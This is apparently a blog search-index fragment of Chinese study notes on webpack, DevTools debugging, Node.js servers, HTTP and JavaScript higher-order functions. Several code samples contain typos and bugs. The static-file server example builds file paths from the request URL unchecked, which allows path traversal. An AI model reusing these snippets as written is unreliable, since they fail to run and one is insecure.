js，为了处理非标准js资源，设计出的资源翻译模块 — loader，将资源翻译为标准 js\n>\n> 与在 html 文件中维护 css 相比，这种方式会有什么优劣？\n>\n> 如何在webpack接入less、sass、stylus？\n\n#### 3.2 处理 js – 接入 Babel\n\n1. 安装依赖 `npm i -D @babel/core @babel/preset-env babel-loader`\n2. 声明 output\n3. 执行 npx webpack\n\n> Babel 有什么功能\n>\n> Babel 与 webpack 分别解决了什么问题\n\n#### 3.3 生成 HTML\n\n1. 安装依赖 `npm i -D html-webpack-plugin`\n2. 声明产物出口 output\n3. 使用插件 `plugins:[new HtmlWebpackPlugin]`\n4. 执行 `npx webpack`\n\n> 相比于手工维护的 HTML 内容，这种自动生成的方式有什么优缺点？\n\n### 4. 工具线\n\n#### 4.1 HMR 浏览器热替换\n\n1. 更改配置项 devServer: { hot: true, open: true } ,watch: true // 持续监听，生成新的\n2. 执行 npx webpack server\n\n#### 4.2 Tree-Shaking 树摇\n\n开启树摇\n\n更改配置项：\n\n+ mode: ”production“,\n\n+ optimization: { usedExports: true }\n\n> 对工具库如Lodash有奇效\n>\n> require 不能进行 tree-shaking\n>\n> \n\n#### 4.3 其他工具\n\n+ 缓存 webpack5后的缓存效果才比较好\n+ Sourcemap\n+ 性能监控\n+ 日志\n+ 代码压缩\n+ 分包\n+ …\n\n> 还有哪些可被划分为”流程类“？\n>\n> 工具类配置具体有什么作用，包括 devtool/cache/stat\n\n\n\n## 3. 理解 Loader\n\n**为了处理非标准 js 资源，设计出资源翻译模块 — Loader，用于将资源翻译为标准  JS**\n\n\n\n### 3.1 使用：\n\n1. 安装 Loader\n2. 添加 module 处理 需要翻译的文件\n\n\n\n### 3.2 认识Loader\n\n#### 链式调用\n\n前面的输出 == 后面的输入，每个 loader 比较内聚，\n\n以 处理 less 文件为例：\n\n+ less-loader：实现 less 到 css 的转换\n+ css-loader：将 css 包装成类似于 module.exports = “${css}” 的内容，包装后的内容符合js 语法\n+ style-loader：将 css 模块包进 require 语句，并在运行时调用 injectStyle 等函数将内容注入到页面的style标签\n\n\n\ndebug工具： ndb `ndb npx webpack`\n\n特点：\n\n+ 链式调用\n+ 支持异步执行\n+ 分 normal、pitch 两种模式\n\n\n\n#### 如何编写\n\n~~~js\n// loader.js\nmodule.exports = function(source,sourceMap,data?){\n    // source 为 文件输入\n    // 可能是文件内容，也可以是上一个 loader 处理结果\n    return source;\n}\n~~~\n\n~~~js\n// eslint-loader/index.js\nimport getOptions from './getOptions';\nimport Linter from './Linter'\nimport cacheLoader from './cacheLoader';\n\nexport defalut function loader(content, map){\n    const options = getOptions(this);\n    const linter = new Linter(this, options);\n    \n    this.cacheable();\n    \n    if(options.cache){\n        cacheLoader(linter, content, map);\n        return;\n    }\n    \n    linter.printOutput(linter.lint(content));\n    this.callback(null, content, map);\n}\n~~~\n\n\n\n参考：Webpack 原理系列七：如何编写loader\n\n#### 常见loader\n\n理解\n\n+ js：babel、eslint、ts、buble、vue、angular2-template   - loader\n+ css：css、style、less、sass、stylus、postcss - loader\n+ html：html、pug、pisthtml - loader\n+ assets：file、val、url、json5 - loader\n\n\n\n> loader 输入是什么？要求输出的是什么？\n>\n> loader 的链式调用是什么意思？如何串联多个 loader？\n>\n> loader 中如何处理异步场景？\n\n\n\n## 4. 理解插件\n\n### 4.1 插件是什么，为什么这么设计？\n\n插件架构精髓：对扩展开放、对修改封闭\n\n\n\n### 4.2 理解插件\n\n插件围绕钩子展开\n\n~~~js\nclass SomePlugin{\n    apply(compiler){\n        compiler.hooks.thisCompilation.tap('SomePlugin', compilation => {\n            \n        })\n    }\n}\n~~~\n\n\n\n钩子的核心信息：\n\n1. 时机：编译过程的特定节点，Webpack 会以钩子的形式通知插件此刻正在发生什么事请\n2. 上下文：通过 tapable 提供的回调机制，以参数方式传递上下文信息；\n3. 交互：在上下文参数对象中附带了很多存在 side effect 的交互接口，插件可以通过这些接口改变\n\n\n\n~~~js\nclass EntryPlugin{\n    apply(compiler){\n        compiler.hooks.compilation.tap( // 时机 compiler.hooks.compilation\n            'EntryPlugin',\n             (compilation,{ normalModuleFactory }) => {  // 参数 compilation\n                 compilation.dependencyfactories.set(  // 交互 dependencyfactories.set\n                 \tEntryDenpendency,\n                    noemalModuleFactory\n                 );\n             });\n        \n        compiler.hooks.make.tapAsync('EntryPlugin', (compilation, callback) => {\n            const {entry,options, context } = this;\n            const dep = EntryPlugin.createDependency(entry, options);\n            compilation.addEntry(context, dep, options, err => {\n                callback(err);\n            })\n            \n        })\n    }\n}\n~~~\n\n\n\n> loader 与插件有什么区同点？\n>\n> ”钩子“有什么作用？如何监听钩子函数？\n\n\n\n## 5. 学习方法\n\n1. 入门应用\n   + 理解打包流程\n   + 熟练掌握常用配置项、loader、插件的使用方法、能够灵活搭建集成 Vue、React、Babel、Eslint、Less、Sass、图片处理等工具的webpack环境\n   + 掌握常见脚手架工具，例如 Vue-cli、create-react-app、@angular/cli\n2. 进阶\n   + 理解Loader、Plugin机制，能够自行开发 Webpack 组件\n   + 理解常见性能优化手段，并能用于解决实际问题\n   + 理解前端工程化概念与生态现状\n3. 大师级\n   + 阅读源码，理解 编译、打包原理，能参与共建\n\n## Q&A\n\n##### 面试掌握程度？\n\n+ loader 有什么作用，怎么写 loader、常见的 loader有什么\n+ 怎么写一个 插件\n+ bundle、chunk、module 是什么含义？\n\n##### require 与 import 导入的区别？\n\n+ 动态/静态代码\n\n##### webpack 与 vite ？\n\n+ vite：速度快 ，无 bundle，对开发性友好\n+ webpack：生态成熟，\n\n##### loader 与 plugin 区别？\n\n+ loader：内容翻译为js\n+ plugin：没有明确输入输出，作用于整个生命周期，在任意时间修改任意webpack组件\n\n##### webpack 与 rollup\n\n+ webpack 更重，应对浏览器\n+ rollup 用来构建npm包，扩展性弱，应对库的场景\n\n##### webpack 优化\n\n##### npx 与 npm\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["青训营","webpack"],"categories":["learningNotes"]},{"title":"前端必须知道的开发调试知识 - 字节青训营","url":"/learningNotes/ByteDance/05 秃头披风侠 前端必须知道的开发调试知识","content":"\n\n## 1. Bug 与 Debug\n\n### 1.1 bug来源\n\n### 1.2 bug 特点\n\n+ 多平台：浏览器、hybrid、nodejs、小程序、桌面应用\n+ 多环境：本地开发环境、线上环境\n+ 多工具：chrome devtools、charles、spy-debugger、whistie、vconsole\n+ 多技巧：console、breakpoint、sourceMap、代理\n\n## 2. Chrome devTool\n\n### 2.1 Elements – 修改元素和样式\n\n> .cls 添加删除类名\n>\n> 右键元素 → fouce state → +- 伪类 / ：hov\n> 对结点进行截图：元素右键 → capture node screenshot\n\n\n\n### 2.2 Console – 日志页面\n\n> 对 log 的值 进行 修改样式\n>\n> ~~~js\n> console.log('%s %o,%c%s',\n>          'hello',          // %s字符串 \n>          {name:'tom'},     // o 对象\n>          'color:red',      // c 样式？\n>          'welcome')        // \n> \n> ~~~\n>\n> console.table 具象化 JSON 数据 转换为 table 格式 \n>\n> console.dir 树形结构\n\n\n\n### 2.3 sources\n\n1. 组成\n\n   + 页面资源文件目录树\n\n   + 代码预览区\n\n   + debug 工具栏\n\n     > 暂停 继续 断点间\n     >\n     > 单步跳过\n     >\n     > 进入函数\n     >\n     > 跳出函数\n     >\n     > 单步执行\n     >\n     > 激活 / 关闭 所有断电\n     >\n     > 代码执行异常处自动\n\n   + 断点调试器\n\n     > xhr/fetch ：当有请求发生时触发断点\n     >\n     > dom ：右键 break on，增删结点触发\n     >\n     > scope：作用域 closure 闭包\n     >\n     > call stack：调用栈 \n\n2. 查看暂停下 变量的值：\n   + breakPoint：debugger; 区域4 的 breakpoints 可以勾选 或 取消 可以打断点；直接鼠标移动可以查看值\n   + 区域4 watch：点击 + 可以添加 变量 查看值\n\n3. 压缩代码如何调试：\n\n   + 用webpack压缩，在webpack.config.js 中 devtools：‘source-map’，\n\n     > 多导出一个 bundle.js.map 把压缩的代码和源码进行映射\n     >\n     > + mappings 字段存储了源文件和source map 映射\n     >   + 英文，表源码及压缩代码的位置关联\n     >   + 逗号，分割一行的内容\n     >   + 分号，换行\n     >\n     > 映射见：murzwin.com/base64vlqhtml\n     >\n     > source map 标准：docs.google.com/document/d/1URGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit\n\n### 2.4 performance — 性能\n\n1. 组成 — 开始录制页面  stop\n\n   + 控制面板\n\n   + 概览面板\n\n     FPS：每秒帧数\n\n     CPU：处理各个任务花费的时间\n\n     NET：各个请求花费的时间\n\n   + 线程面板\n\n     Frames：帧线程\n\n     Main：主线程、负责执行js，解析html css 完成绘制\n\n     Raster：raster 线程，负责完成某个layer 或 某些块 tile 的绘制\n\n   + 统计面板\n\n\n\n### 2.5 Network — 请求相关\n\n可以自定义网速\n\n<img src=\"https://i.bmp.ovh/imgs/2022/01/38b5ba1f5f907e8d.png\">\n\n\n\n### 2.6 application — 本地存储相关\n\n### 2.7 storage中点击 clean site data 清除缓存\n\n\n\n## 3. 移动端 h5 调试\n\n1. 真机调试：推荐扫码\n\n2. 代理调试：\n\n3. 常用工具：\n\n   charles：适合查看、控制网络请求，分析数据\n\n   fiddler：与上面类似，适合windows 平台\n\n   spy-debugger：远程调试手机页面、抓包\n\n   whistie：基于node实现的跨平台web调试代理工具\n\n\n\n## 4. 常用开发技巧：\n\n+ source：oversides，勾选，在修改后刷新会保留，右边竖三点，more tools -> change 面板会显示 修改的内容\n\n+ 跨域问题：报 cors error 跨域错误\n\n  使用代理工具\n\n  代理：解决了同源策略的哪一项，为什么能解决跨域\n\n  > 同源限制只显示了浏览器\n\n  <img src=\"https://i.bmp.ovh/imgs/2022/01/20d4963af61cfd07.png\">\n\n+ 启用本地source map：\n\n  可以把 source map 代理到本地\n\n+ 前端埋点\n\n+ 小黄鸭\n\n","tags":["js","青训营"],"categories":["learningNotes"]},{"title":"Nodejs 与前端开发实战 - 字节青训营","url":"/learningNotes/ByteDance/09 欧阳亚东 Nodejs与前端开发实战","content":"\n## 1. Nodejs 的应用场景 why\n\n#### 前端工程化\n\n+ Bundle：webpack、vite、esbuild、parcel\n+ Uglify：uglifyjs\n+ Transpile：bablejs、typescript\n+ 其他语言加入竞争：esbuild、parcel、prisma\n+ 现状：难以替代\n\n#### web 服务端应用\n\n+ 学习曲线平缓，开发效率高\n+ 运行效率接近常见的编译语言\n+ 社区生态丰富及工具链成熟 npm、v8 inspector\n+ 与前端结合的场景会有优势 ssr\n+ 现状：竞争激烈，nodejs 有自己独特的优势\n\n#### Electron 跨端桌面应用\n\n+ 商业应用：vscode、slack、discord、zoom\n+ 大型公司内的效率工具\n+ 现状：大部分在选型时，都值得考虑\n\n#### Nodejs 在字节\n\n+ BFF、SSR\n+ 服务端应用：头条搜索、西瓜视频\n+ Electron：飞连、飞书\n\n\n\n## 2. Nodejs 运行时结构 what\n\n<img src=\"https://i.bmp.ovh/imgs/2022/01/1a6e5ab8fa56abba.png\" style=\"zoom:67%;\" >\n\n> 社区npm代码 ：acron、node-inspect 调试、npm本身\n>\n> N-API：js性能太低，想用更native的语言\n>\n> v8：实现js运行时\n>\n> libuv：封装了操作系统api，nodejs最核心的内容\n>\n> nghttp2：与 http2 相关的模块\n>\n> zlib：做一些场景压缩解压缩的算法\n>\n> c-ares：做dns查询的库\n>\n> llhttp：做http协议的解析\n>\n> openssl：网络层的加密解密协议\n\n#### V8，libuv\n\nV8：JavaScript Runtime，诊断调试工具 inspector\n\nlibuv：eventloop 事件循环，syscall 系统调用\n\n举例：用 node-fetch 发起请求时…\n\n> nodejs 其实是基于 v8 做的。\n>\n> 面试 ：libuv是用来干嘛的？\n\n#### 特点\n\n+ 异步 I/O\n\n+ 单线程 worker_thread可以起独立线程，但每个线程的模型没有太大变化\n\n  JS 单线程：JS 线程 + uv 线程池 + V8 任务线程池 + V8 inspector 线程\n\n  优点：不用考虑多线程状态同步问题，也就不需要锁；同时还能比较较高效地利用系统资源\n\n  缺点：阻塞会产生更多负面影响 – 使用多进程 或者 多线程\n\n+ 跨平台\n\n  Nodejs 跨平台 + JS 无需编译环境 ( + web 跨平台 + 诊断工具跨平台 ) – 开发成本低、整体学习成本低\n\n\n\n## 3. 编写 Http Server how\n\n### 3.0 安装 nodejs\n\n~~~js\n// json\nconst http = require('http');\n\nconst server = http.createServer((req,res) => {\n    const bufd = [];\n    req.on('data',(buf) => {\n        bufs.push(buf)\n    })\n    req.on('end',() => {\n        const buf = Buffer.concat(bufs).toString('utf8');\n        let msg = 'hello';\n        try{\n            const ret = JSON.parse(buf);\n            msg = ret.msg;\n        }catch(err){\n            \n        }\n        const responseJson = {\n            msg:`receive:${msg}`\n        }\n        res.setHeader('Content-Type', 'application/json');\n        res.end(JSON.stringify(responseJson))\n    })\n})\n\nconst port = 3000;\n\nserver.listen(port, ()=>{\n  console.log(`server listen on:${port}`);  \n})\n~~~\n\n\n\n### 3.1 编写 Http Server + Client ，收发 GET，POST\n\n~~~js\nconst http = require('http')\n\nconst body = JSON.stringify({\n    msg: 'Hello from my own client'\n})\n\nconst req = http.request('http://127.0.0.1:3000',{\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n    }\n}, res => {\n    const bufs = [];\n    res.on('data', buf =>{\n        bufs.push(buf)\n    })\n    res.on('end', () => {\n        const buf = Buffer.concat(bufs);\n        const json = JSON.parse(buf);\n        console.log('json.msg is:', json.msg)\n    })\n})\nreq.end(body)\n~~~\n\n\n\n~~~js\n// 用 promise + async await 重写这两例子\n// 技巧：将callback 转换为 promise\n// eg：改写 上上个代码\nconst http = require('http');\n\nconst server = http.createServer(async (req,res) => {\n    const msg = await new Promise((resolve, reject) => { //change\n        const bufd = [];\n    \treq.on('data',(buf) => {\n        \tbufs.push(buf)\n    \t})\n        req.on('error', (err) => {  // change\n            reject(err)             // change\n        })                          // change\n        req.on('end',() => {\n            const buf = Buffer.concat(bufs).toString('utf8');\n            let msg = 'hello';\n            try{\n                const ret = JSON.parse(buf);\n                msg = ret.msg;\n            }catch(err){\n\n            }\n            resolve(msg);   // change\n        })\n    })\n     const responseJson = {\n            msg:`receive:${msg}`\n      }\n      res.setHeader('Content-Type', 'application/json');\n      res.end(JSON.stringify(responseJson))\n})\n\nconst port = 3000;\n\nserver.listen(port, ()=>{\n  console.log(`server listen on:${port}`);  \n})\n~~~\n\n\n\n### 3.2 编写静态资源服务器\n\n简单静态文件服务：\n\n与高性能、可靠的服务相比，还差：CDN 缓存加速、分布式储存、容灾\n\n外部服务：cloudflare，七牛云，阿里云，华山云\n\n> 用 stream 风格的 api 有什么好处？\n>\n> 占用尽可能少的内存空间、内存使用率更好\n\n~~~js\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst url = require('url');\n\nconst folderPath = path.resolve(__dirname, './static');\n\nconst server = http.createServer((req,res) => {\n    // expected http://127.0.0.1:3000/index.html\n    const info = url.parse(req.url);\n    // static/index.html\n    const filepath = path.resolve(folderPath, './', info.path);\n    // stream api..\n    const filestream = fs.createReadStream(filepath);\n    res.pipe(filestream)\n    \n})\n\nconst port = 3000;\n\nserver.listen(port, ()=>{\n  console.log(`server listen on:${port}`);  \n})\n~~~\n\n\n\n### 3.3 编写 React SSR\n\nSSR — server side rendering 特点：\n\n+ 相比传统 HTML 模板引擎：避免重复编写代码\n+ 相比 SPA：首屏渲染更快，seo 友好\n+ 缺点：通常qps 较低，前端代码编写时要考虑服务端渲染情况\n\n### 3.4 适用 inspector 进行调试、诊断\n\n+ v8 inspector：开箱即用，特性丰富强大，与前端开发一致，跨平台\n  + 启动时 `node  --inspect 文件.js `\n  + open http://localhost:9229/json\n+ 场景：\n  + 查看 console.log 内容\n  + breakpoint\n  + 高 cpu、死循环：cpuprofile\n  + 高内存占用：heapsnapshot\n  + 性能分析\n\n### 3.5 部署简介\n\n解决的问题：\n\n+ 守护进程：当进程退出时，重新拉起\n+ 多进程：cluster 便捷地利用多进程\n+ 记录进程状态，用于诊断\n\n容器环境：\n\n+ 通常有健康检查的手段，只需要考虑多核 cpu 利用率即可\n\n## 4. 延伸话题\n\nnodejs 贡献代码\n\n追踪/诊断\n\nWASM，NAPI \n\n","tags":["青训营","nodejs"],"categories":["learningNotes"]},{"title":"HTTP 指南 - 字节青训营","url":"/learningNotes/ByteDance/08 杨超男 http指南","content":"\n\n## 1. 初始：什么是HTTP\n\n### 什么是HTTP\n\n+ Hyper Text Transfer Protocol\n+ 应用层协议、基于TCP\n+ 请求、响应\n+ 简单可扩展\n+ 无状态\n\n## 2. 协议分析：报文结构\n\n### 发展\n\n+ HTTP 0.9 — 单行协议\n\n  请求GET/mypage.html、响应只有HTML文档\n\n+ HTTP 1.0 — 构建可扩展性\n\n  增加了Header、有了状态码、支持多种文档、…\n\n+ HTTP 1.1 — 标准化协议\n\n  链接复用、缓存、内容协商、…\n\n+ HTTP 2 — 更加优异的表现\n\n  二进制协议、压缩header、服务器推送、…\n\n+ HTTP 3 — 草案\n\n### 报文\n\n#### + start line ：Method Path Version\n\n+ ##### Method：\n\n  GET — 请求一个指定资源，只用于获取数据\n\n  POST — 用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用 \n\n  PUT — 用于请求有效载荷替换目标资源的所有当前表示\n\n  DELETE — 删除指定资源\n\n  HEAD — 请求与get响应相同的响应头\n\n  CONNECT — 建立一个到目标资源标识的服务器的隧道\n\n  OPTIONS — 用于描述目标资源的通信选项\n\n  TRACE — **沿着到目标资源的路径执行一个消息环回测试**\n\n  PATCH — **用于对资源应用部分修改**\n\n  > Safe：不会修改服务器的数据的方法：GET、HEAD、OPTIONS\n  >\n  > Idempotent幂等：同样的请求被执行一次或多次的效果是一样的，服务器的状态也是一样的：GET、HEAD、OPTIONS、PUT、DELETE\n\n+ ##### 状态码\n\n  200、301、302、401 (请求未经授权)、404、500、504(网关或代理服务器处理超时)\n\n+ #### RESTful API\n\n  一种API设计风格，REST — Representational State Transfer\n\n  + 每一个URI代表一种资源\n  + 客户端和服务器之间，传递这种资源的某种表现层\n  + 客户端通过HTTP method，对服务器资源进行操作，实现“表现层状态转化”\n\n#### + HTTP Headers \n\n##### 请求头\n\nAccept：接收类型，表示浏览器支持的MIME类型，对标服务器端返回的Content-type\n\nContent-Type：客户端发送出去的实体内容的类型\n\nCache-Control：指定请求和响应遵循的缓存机制\n\nIf-Modified-Since：对应服务端的**Last-Modified**，用来匹配看文件是否变动，精确1s内\n\nExpires：缓存控制，在这个时间内直接使用请求\n\nMax-age：资源再本地缓存多少秒\n\nIf-None-Match：对应服务端**Etag**，匹配文件内容是否改变，较精确\n\nCookie：有cookie并且同域访问时会自动带上\n\nReferer：该页面的来源URL，适用所有类型请求，详细到页面地址，csrf拦截会用到\n\nOrigin：最初请求从哪发起的，只精确到端口号，比上更尊重隐私\n\nUser-Agent：用户客户端的一些必要信息 \n\n##### 响应头\n\nContent-Type：服务端返回的实体内容的类型\n\nCache-Control：指定请求和响应遵循的缓存机制\n\n**Last-Modified**：请求资源的最后修改时间\n\nExpires：在什么时候认为文档已经过期，不再缓存\n\nMax-age：资源再本地缓存多少秒，开启Cache-Control后有效\n\n**Etag**：资源的特定版本标识符\n\nSet-Cookie：设置于页面关联的cookie，将其传给客户端\n\nServer：服务器的一些信息\n\nAccess-Control-Allow-Origin：服务器端允许请求Origin头部\n\n##### 缓存\n\n+ 强缓存\n  + Expires，时间戳\n  + Cache-Content\n    + 可缓存性：no-cache 协商缓存验证、no-store 不使用任何缓存\n    + 到期：max-age 存储的最大周期/秒，相对于请求时间\n    + 重新验证/重新加载：must-revalidate：一旦资源过期，在成功向原始服务器验证之前，不能使用\n+ 协商缓存\n  + Etag/If-None-Match：资源特定版本的标识符\n  + Last-Modified/If-Modified-Since：最后最该时间\n\n<img src = 'https://i.bmp.ovh/imgs/2022/01/b367c028a88374dc.png' style=\"zoom:67%;\" />\n\n##### cookie\n\nName=value\n\nExpires=Date：有效期，缺省时表在浏览器关闭前有效\n\nPath=Path：限制指定cookie的发送范围的文件目录，默认为当前\n\nDomain=domain：限制cookie生效的域名，默认为创建cookie的服务域名\n\nsecure：仅在HTTPS安全连接时，才可以发送cookie\n\nHttpOnly：js脚本无法获得\n\nSameSite=[None|Strict|Lax]：None同站、跨站请求都可以发送、Strict 仅在同站发送、lax允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送\n\n#### + empty line\n\n#### + body\n\n### 发展\n\n#### HTTP2 更快、更稳定、更简单\n\n帧 frame：HTTP/2 通信的最小单位，每个帧都包含帧头，至少会标识出当前帧所属的数据流\n\n+ 二进制\n\n消息：与逻辑请求或响应消息对应的完整的一系列帧\n\n数据流：已建立的连接内的双向字节流，可以承载一条或多条消息\n\n+ 交错发送，接收方重组织\n\n+ HTTP/2 连接都是永久的，而且仅需要每个来源一个连接\n+ 流控制：组织发送方 向 接收方 发送大量数据的机制\n+ 服务器推送\n\n#### HTTPS 概述\n\n+ HTTPS：Hypertext Transfer Protocol Secure\n\n+ 经过 TSL/SSL加密\n+ 对称加密：加解密都是使用同一个密钥\n+ 非对称加密：需要是哦那个两个不同的密钥，公钥 public key、私钥 private key\n\n## 3. 常见场景：静态资源、登陆\n\n#### 静态资源 — 今日头条 index.css\n\n状态码200就一定是发起请求了吗？\n\n从Response中观察 缓存策略、资源类型、允许访问的域名\n\n静态资源方案：缓存+CDN+文件打包时产生的hash\n\n#### 登录\n\n为什么有options的请求？ – cross-origin\n\ncors：复杂请求会进行预请求，获知服务器端是否允许该跨源请求\n\n> 相关协议头：\n>\n> Access-Control-Allow-Origin、\n>\n> Access-Control-Expose-Headers\n>\n> Access-Control-Max-Age\n>\n> Access-Control-Allow-Credentials\n>\n> Access-Control-Allow-Methods\n>\n> Access-Control-Allow-Headers\n>\n> Access-Control-Request-Method\n>\n> Access-Control-Request-Method\n>\n> Access-Control-Request-Headers\n>\n> Origin\n\n跨域的解决方案：cors、代理服务器、iframe、jsonp…\n\n从Response 和 Request 观察 向什么地址做了什么动作、携带了/返回了什么信息\n\n下一次进入页面为什么能记住登陆态？ — 鉴权 session+cookie 、JWT json web token\n\n进入同个网站的其他站点为什么也有登录态？— SSO 单点登录\n\n## 4. 实际应用：浏览器与node中使用\n\n### 浏览器\n\n#### + AJAX 之 XHR\n\n+ XHR：XMLHttpRequest\n+ readyState：\n  + 0 UNSENT 代理被创建\n  + 1 OPENED open() 已被调用\n  + 2 Header-received send() 已经被调用，获得头部和状态\n  + 3 loading 下载中，responseText 属性已有部分数据\n  + 4 done 下载已完成\n\n#### + AJAX 之 Fetch\n\n+ XHLHttpRequest 的升级版\n+ 使用 Promise\n+ 模块化设计，Response，Request、Header 对象\n+ 通过数据流处理对象，支持分块读取\n\n### node\n\n标准库：HTTP/HTTPS\n\n### 实战\n\n请求库：axios\n\n用户体验：\n\n+ 网络优化：http2、cdn动态加速、dns预解析、网络预连接、域名收敛/发散、压缩、https性能优化\n+ 稳定性：重试机制(超时、有误)、缓存、数据安全(Https、劫持)\n\n\n\n## 5.了解更多：不止HTTP协议一个选择\n\n### WebSocket\n\n+ 浏览器与服务器进行全双工通讯的网络技术\n+ URL使用ws:// 或 wss:// 等开头\n+ 场景：实时性要求高、聊天室\n\n### QUIC\n\n基于http3，udp，目前还是草案状态","tags":["青训营","网络"],"categories":["learningNotes"]},{"title":"月影讲js - 字节青训营","url":"/learningNotes/ByteDance/03 月影讲js","content":"\n1. 通过 html css 触发事件\n  ~~~html\n  <input id=\"modeCheckBox\" type=\"checkbox\"></input>\n  <div class=\"content\">\n    <label id=\"modeBtn\" for=\"modeCheckBox\"></label>\n  </div>\n  // 点击 label 就会选择 input[type=\"checkbox\"]\n  <style>\n      #modeCheckBox:checked + .content{\n          background-color:black;\n      }\n      \n  </style>\n\n  ~~~\n\n2. 组件 — 自定义事件 — 解耦\n\n   ~~~js\n   // 自定义事件\n   const detail = {index: idx};\n   const event = new CustomEvent('slide',{bubbles:true, detail}) \n   this.contailer.dispatchEvent(event)\n   \n   let dom = document.querySelector('#app');\n   // 绑定事件， 传递过来的值可以通过ev.detail 来获取\n   dom.addEventListener('log-in',(ev) => {\n       const { detail } = ev;\n       console.log(detail);  // hello\n   })\n   // 派发事件，需要传入两个参数，一个是事件类型，另外一个是一个对象，detail就是传递过去的值\n   dom.dispatchEvent(new CustomEvent('log-in',{\n       detail:'hello'\n   }))\n   ~~~\n\n   web页面抽出来一个个包含模板 html、功能 js 和 样式 css\n\n   设计原则：封装性、正确性、扩展性、复用性\n\n   实现步骤：结构设计、展现效果、行为设计（API 功能    Event 控制流 — 解耦）\n\n   三次重构：\n\n   + 使用插件：code.h5jun.com/weru/edit?js,output\n   + 模板化：code.h5jun.com/weru/3/edit?js,output\n   + 组件框架：code.h5jun.com/vata/4/edit?js,output\n\n3. 过程抽象\n\n   为了让“只执行一次”的**需求覆盖不同的事件处理，可以将这个需求剥离出来，这个过程就是过程抽象**\n\n    once：code.h5jun.com/zoqop/edit?js,output\n\n   **高阶函数：函数作为函数的 参数 或者 返回值，常用于函数装饰器**\n\n   > 接收一个函数作为参数，返回另一个参数，eg：\n   >\n   > ~~~js\n   > // 等价装饰 0级高阶函数 等价范式\n   > // 调用次函数装饰器 相当于 直接调用 fn  \n   > function HOF0(fn){\n   >     return function(...args){\n   >         return fn.apply(this,args);\n   >     }\n   > }\n   > ~~~\n   >\n   > \n\n   > 常用的高阶函数：\n   >\n   > + once\n   >\n   >   ~~~js\n   >   function limit(fn,times = 1){\n   >       return function(...args){\n   >           return times-- > 0 ? fn.apply(this,args) : null; \n   >       }\n   >   }\n   >   function foo = limit(() => {\n   >       console.log('foo')\n   >   },2)\n   >   ~~~\n   >\n   > + throttle：code.h5jun.com/gale/1/edit?js,output\n   >\n   >   ~~~js\n   >   function throttle(fn,dur){\n   >       var timer;\n   >       return function(...args){\n   >           if(timer == null){\n   >               fn.apply(this,arguments);\n   >               timer = setTimeout(()=>{\n   >                   cleanTimeout(timer);\n   >               },dur)\n   >           }\n   >       }\n   >   }\n   >   ~~~\n   >\n   > + debounce：code.h5jun.com/wik/edit?js,output\n   >\n   >   ~~~js\n   >   function debounce(fn, dur){\n   >       dur = dur || 100;\n   >       var timer;\n   >       return function(){\n   >           clearTimeout(time);\n   >           timer = setTimeout(()=>{\n   >               fn.apply(this,arguments);\n   >           },dur);\n   >       }\n   >   }\n   >   ~~~\n   >\n   > + consumer ：code.h5jun.com/roka/7/edit?js,output   res + i = res \n   >\n   >   ​                       code.h5jun.com/bucu/3/edit?js,output     hit + 123\n   >\n   >   ~~~js\n   >   function consumer(fn,time){\n   >       let tasks = [],timer;\n   >       return function(...args){\n   >           tasks.push(fn.bind(this,...args));\n   >           if(timer == null){\n   >               timer = setInterval(() => {\n   >                   tasks.shift().call(this);\n   >                   if(tasks.length <= 0){\n   >                       clearTnterval(timer);\n   >                       timer = null;\n   >                   }\n   >               },time)\n   >           }\n   >       }    \n   >   }\n   >   ~~~\n   >\n   > + lterative：code.h5jun.com/kapef/edit?js,output  批量操作\n   >\n   >   ~~~js\n   >   const inIterable = obj => \n   >         obj != null %% typeof obj[Symbol.iterator] === 'function';\n   >   \n   >   function iterative(fn){\n   >       return function(subject, ...rest){\n   >           if(inIterable(subject)){\n   >               const ret = [];\n   >               for(let obj of subject){\n   >                   ret.push(fn.apply(this,[obj, ...rest]));\n   >               }\n   >               return ret;\n   >           }\n   >           return fn.apply(this,[subject, ...rest]);\n   >       }\n   >   }\n   >   ~~~\n   >\n   >   \n\n   为什么使用高阶函数：减少系统的纯函数、便于测试\n\n   > pure纯函数：输入确定后输出就是确定的，便于做单例测试 add(x,y)\n   >\n   > impure非纯函数：依赖外部环境，setColor次序，时间，次数不同结构不同 \n   >\n   >    （操作dom都非）可以用纯函数 iterative 包 setColor 得到一个纯函数\n\n4. 编程范式\n\n   命令式：关心执行过程 \n\n   和 \n\n   声明式：不关心\n\n   ~~~js\n   // 声明式 三态\n   function toggle(... actions){\n       return function(...args){\n           let action = actions.shift();\n           actions.push(action);\n           return action.apply(this,args);\n       }\n   }\n   \n   swicher.onclick = toggle(\n       evt => evt.target.className = 'off',\n       evt => evt.target.className = 'on'\n   )\n   ~~~\n\n   \n\n5. 案例\n\n   1. 交通灯\n   \n   2. 洗牌\n   \n      ~~~js\n      function shuffle(cards){\n          const c = [...cards];\n          for(let i = c.length; i > 0; i--){\n              const pindex = Math.floor(Math.random() * i);\n              [c[pindex],c[i-1]] = [c[i-1], c[pindex]];\n          }\n          return c;\n      }\n      \n      // 抽牌\n      // code.h5jun.com/zamuv/edit?js,console\n      function * draw(cards){\n          const c = [...cards];\n          for(let i = c.length; i > 0; i--){\n              const pindex = Math.floor(Math.random() * i);\n              [c[pindex],c[i-1]] = [c[i-1], c[pindex]];\n              yield c[i-1];\n          }\n      }\n      ~~~\n   \n      \n   \n   3. 是否是4的幂\n   \n   4. 分红包\n   \n      > 利用了抽牌的思路：code.h5jun.com/luba/edit?js,console\n","tags":["js","青训营"],"categories":["learningNotes"]},{"title":"包装对象与toString、valueOf隐式调用","url":"/furtherNotes/further/01 toString valueof","content":"\n>\n> 问辉哥for in hasOwnPrototype 的时候，他问我String 有没有 toString 方法，\n>\n> 然后提到了包装对象 和 toString 的隐式调用\n>\n> 包装对象 https://www.jianshu.com/p/32465288e738\n>\n> 隐式转换 https://juejin.cn/post/6844903557968166926\n>\n> 隐式调用 https://juejin.cn/post/6844903749090017294\n\n\n### 1. 包装对象\n\n#### 1.1 定义\n\n对象是 JavaScript 语言中最主要的数据类型，三种原始类型的值：Number、Boolean、String 的值，在一定的条件下也会**自动转为对象**，即**原始类型的 ” 包装对象 “** 